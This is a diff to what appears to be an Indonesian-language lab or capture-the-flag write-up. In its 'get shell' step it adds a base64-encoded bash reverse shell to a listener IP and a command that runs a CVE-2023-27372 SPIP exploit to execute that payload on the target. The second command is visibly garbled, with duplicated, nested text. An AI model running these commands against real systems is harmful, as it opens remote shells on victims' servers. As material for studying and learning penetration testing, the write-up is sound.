@@ -70,5 +70,14 @@ Dapatkan Shell:
     
 <img width="668" height="493" alt="image" src="https://github.com/user-attachments/assets/d8a38c1c-a4f6-494a-b41a-2c4b3682e7df" />
 
+```bash
+echo -n "bash -c '/bin/bash -i >& /dev/tcp/192.168.173.67/443 0>&1'" | base64 -w0
+```
+<img width="837" height="122" alt="image" src="https://github.com/user-attachments/assets/79379333-37ef-4d33-9e25-80036a3e2ac4" />
+
+```bash
+python3 CVE-2023-27372.py -u 'http://10.49.147.115/spip' -c "echo python3 CVE-2023-27372.py -u 'http://10.49.147.115/spip' -c "echo YmFzaCAtYyAnL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTczLjY3LzQ0MyAwPiYxJw==base64 -d | bash"
+```
+
 
 
